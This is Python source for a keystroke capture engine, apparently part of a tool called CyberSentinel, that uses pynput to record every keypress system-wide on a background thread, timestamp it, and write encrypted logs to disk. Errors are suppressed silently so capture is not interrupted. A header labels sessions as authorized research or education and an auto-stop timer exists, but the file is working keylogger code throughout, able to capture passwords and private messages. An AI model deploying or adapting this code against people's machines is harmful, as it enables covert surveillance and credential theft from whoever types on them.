"""
CyberSentinel - Keystroke Capture Engine
==========================================
Core keystroke monitoring engine using pynput.
Captures keystrokes with timestamps, buffers them,
and writes encrypted logs to disk.

Features:
    - Buffered keystroke capture
    - Special key mapping
    - Timestamp per keystroke
    - Auto-flush on buffer full or timer
    - Encrypted log output
    - Session metadata tracking
    - Thread-safe operation
"""

import threading
import time
import json
import csv
import io
from datetime import datetime
from pathlib import Path
from collections import deque

from pynput import keyboard

from config.settings import (
    LOG_DIR,
    LOG_FILE_PREFIX,
    LOG_FORMAT,
    BUFFER_SIZE,
    FLUSH_INTERVAL_SECONDS,
    CAPTURE_SPECIAL_KEYS,
    CAPTURE_TIMESTAMPS,
    SESSION_ID,
    AUTO_STOP_HOURS,
    WATERMARK_LOGS,
    APP_NAME,
    APP_VERSION,
)
from utils.encryption import EncryptionManager


# Mapping of special keys to readable names
SPECIAL_KEY_MAP = {
    keyboard.Key.space: " [SPACE] ",
    keyboard.Key.enter: " [ENTER]\n",
    keyboard.Key.tab: " [TAB] ",
    keyboard.Key.backspace: " [BACKSPACE] ",
    keyboard.Key.delete: " [DELETE] ",
    keyboard.Key.esc: " [ESC] ",
    keyboard.Key.shift: " [SHIFT] ",
    keyboard.Key.shift_r: " [R_SHIFT] ",
    keyboard.Key.ctrl_l: " [L_CTRL] ",
    keyboard.Key.ctrl_r: " [R_CTRL] ",
    keyboard.Key.alt_l: " [L_ALT] ",
    keyboard.Key.alt_r: " [R_ALT] ",
    keyboard.Key.caps_lock: " [CAPSLOCK] ",
    keyboard.Key.up: " [UP] ",
    keyboard.Key.down: " [DOWN] ",
    keyboard.Key.left: " [LEFT] ",
    keyboard.Key.right: " [RIGHT] ",
    keyboard.Key.home: " [HOME] ",
    keyboard.Key.end: " [END] ",
    keyboard.Key.page_up: " [PGUP] ",
    keyboard.Key.page_down: " [PGDN] ",
    keyboard.Key.insert: " [INSERT] ",
    keyboard.Key.print_screen: " [PRTSC] ",
    keyboard.Key.f1: " [F1] ",
    keyboard.Key.f2: " [F2] ",
    keyboard.Key.f3: " [F3] ",
    keyboard.Key.f4: " [F4] ",
    keyboard.Key.f5: " [F5] ",
    keyboard.Key.f6: " [F6] ",
    keyboard.Key.f7: " [F7] ",
    keyboard.Key.f8: " [F8] ",
    keyboard.Key.f9: " [F9] ",
    keyboard.Key.f10: " [F10] ",
    keyboard.Key.f11: " [F11] ",
    keyboard.Key.f12: " [F12] ",
}


class KeystrokeEngine:
    """
    Core keystroke capture engine.
    Captures keyboard input, buffers it, and writes
    encrypted logs in the configured format.
    """

    def __init__(self, encryption_manager: EncryptionManager = None):
        # Encryption
        self.crypto = encryption_manager or EncryptionManager()

        # Keystroke buffer
        self._buffer = deque(maxlen=10000)
        self._buffer_lock = threading.Lock()
        self._recent_keys = deque(maxlen=500)  # For dashboard display

        # Session tracking
        self.session_id = SESSION_ID
        self.start_time = None
        self.total_keystrokes = 0
        self.keys_per_minute = 0.0

        # State
        self._running = False
        self._listener = None
        self._flush_timer = None
        self._stats_timer = None
        self._log_file = LOG_DIR / f"{LOG_FILE_PREFIX}_{SESSION_ID}.{LOG_FORMAT}.enc"

        # Callbacks
        self._on_key_callback = None

        # Write session header
        self._write_session_header()

    def _write_session_header(self):
        """Write session metadata header to log file."""
        if WATERMARK_LOGS:
            header = {
                "session_id": self.session_id,
                "application": APP_NAME,
                "version": APP_VERSION,
                "started_at": datetime.now().isoformat(),
                "log_format": LOG_FORMAT,
                "encryption_enabled": self.crypto.enabled,
                "purpose": "Authorized cybersecurity research / education",
            }
            encrypted_header = self.crypto.encrypt(
                f"SESSION_HEADER:{json.dumps(header)}\n"
            )
            with open(self._log_file, "w", encoding="utf-8") as f:
                f.write(encrypted_header + "\n")

    def set_key_callback(self, callback):
        """Set a callback function called on each keystroke for real-time UI updates."""
        self._on_key_callback = callback

    def start(self):
        """Start the keystroke capture engine."""
        if self._running:
            return

        self._running = True
        self.start_time = datetime.now()

        # Start keyboard listener
        self._listener = keyboard.Listener(
            on_press=self._on_key_press,
            on_release=self._on_key_release,
        )
        self._listener.daemon = True
        self._listener.start()

        # Start periodic flush timer
        self._start_flush_timer()

        # Start stats calculation timer
        self._start_stats_timer()

        # Schedule auto-stop
        if AUTO_STOP_HOURS > 0:
            auto_stop = threading.Timer(
                AUTO_STOP_HOURS * 3600,
                self._auto_stop,
            )
            auto_stop.daemon = True
            auto_stop.start()

    def stop(self):
        """Stop the keystroke capture engine and flush remaining buffer."""
        if not self._running:
            return

        self._running = False

        # Stop listener
        if self._listener:
            self._listener.stop()
            self._listener = None

        # Cancel timers
        if self._flush_timer:
            self._flush_timer.cancel()
        if self._stats_timer:
            self._stats_timer.cancel()

        # Final flush
        self._flush_buffer()

        # Write session footer
        self._write_session_footer()

    def _on_key_press(self, key):
        """Handle key press events."""
        if not self._running:
            return False

        timestamp = datetime.now().isoformat() if CAPTURE_TIMESTAMPS else None
        key_str = self._key_to_string(key)

        if key_str is None:
            return  # Skip unmapped special keys when CAPTURE_SPECIAL_KEYS is False

        # Create keystroke record
        record = {
            "key": key_str,
            "event": "press",
            "timestamp": timestamp,
        }

        # Add to buffer
        with self._buffer_lock:
            self._buffer.append(record)
            self._recent_keys.append(key_str)
            self.total_keystrokes += 1

        # Trigger callback for real-time display
        if self._on_key_callback:
            try:
                self._on_key_callback(record)
            except Exception:
                pass

        # Check if buffer should be flushed
        if len(self._buffer) >= BUFFER_SIZE:
            self._flush_buffer()

    def _on_key_release(self, key):
        """Handle key release events (used for modifier key tracking)."""
        pass  # Can be extended for key-combination detection

    def _key_to_string(self, key) -> str:
        """Convert a key event to a readable string."""
        # Check if it's a special key
        if isinstance(key, keyboard.Key):
            if not CAPTURE_SPECIAL_KEYS:
                # Still capture essential keys
                if key in (keyboard.Key.space, keyboard.Key.enter,
                           keyboard.Key.tab, keyboard.Key.backspace):
                    return SPECIAL_KEY_MAP.get(key, "")
                return None
            return SPECIAL_KEY_MAP.get(key, f" [{key.name.upper()}] ")

        # Regular character key
        try:
            return key.char if key.char else ""
        except AttributeError:
            return ""

    def _flush_buffer(self):
        """Flush the keystroke buffer to encrypted disk storage."""
        with self._buffer_lock:
            if not self._buffer:
                return

            records = list(self._buffer)
            self._buffer.clear()

        try:
            # Format records based on configured format
            if LOG_FORMAT == "json":
                formatted = json.dumps(records, indent=None)
            elif LOG_FORMAT == "csv":
                output = io.StringIO()
                writer = csv.DictWriter(output, fieldnames=["key", "event", "timestamp"])
                for record in records:
                    writer.writerow(record)
                formatted = output.getvalue()
            else:  # txt
                formatted = "".join(r["key"] for r in records)

            # Encrypt and write
            encrypted = self.crypto.encrypt(formatted)
            with open(self._log_file, "a", encoding="utf-8") as f:
                f.write(encrypted + "\n")

        except Exception as e:
            # Fail silently to not interrupt monitoring
            pass

    def _start_flush_timer(self):
        """Start periodic buffer flush timer."""
        if not self._running:
            return

        self._flush_timer = threading.Timer(
            FLUSH_INTERVAL_SECONDS,
            self._periodic_flush,
        )
        self._flush_timer.daemon = True
        self._flush_timer.start()

    def _periodic_flush(self):
        """Periodic flush callback."""
        self._flush_buffer()
        if self._running:
            self._start_flush_timer()

    def _start_stats_timer(self):
        """Start periodic stats calculation."""
        if not self._running:
            return

        self._stats_timer = threading.Timer(5.0, self._calculate_stats)
        self._stats_timer.daemon = True
        self._stats_timer.start()

    def _calculate_stats(self):
        """Calculate typing statistics."""
        if self.start_time:
            elapsed_minutes = (
                datetime.now() - self.start_time
            ).total_seconds() / 60
            if elapsed_minutes > 0:
                self.keys_per_minute = round(
                    self.total_keystrokes / elapsed_minutes, 1
                )

        if self._running:
            self._start_stats_timer()

    def _auto_stop(self):
        """Auto-stop after configured hours."""
        if self._running:
            self.stop()

    def _write_session_footer(self):
        """Write session summary footer to log file."""
        footer = {
            "session_ended": datetime.now().isoformat(),
            "total_keystrokes": self.total_keystrokes,
            "duration_seconds": (
                (datetime.now() - self.start_time).total_seconds()
                if self.start_time else 0
            ),
            "avg_keys_per_minute": self.keys_per_minute,
        }
        encrypted_footer = self.crypto.encrypt(
            f"SESSION_FOOTER:{json.dumps(footer)}\n"
        )
        with open(self._log_file, "a", encoding="utf-8") as f:
            f.write(encrypted_footer + "\n")

    def get_recent_keys(self, count: int = 200) -> list:
        """Get the most recent keystrokes for display."""
        return list(self._recent_keys)[-count:]

    def get_stats(self) -> dict:
        """Get current session statistics."""
        elapsed = 0
        if self.start_time:
            elapsed = (datetime.now() - self.start_time).total_seconds()

        return {
            "session_id": self.session_id,
            "running": self._running,
            "total_keystrokes": self.total_keystrokes,
            "keys_per_minute": self.keys_per_minute,
            "elapsed_seconds": round(elapsed, 1),
            "buffer_size": len(self._buffer),
            "log_file": str(self._log_file),
        }

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def log_file(self) -> Path:
        return self._log_file
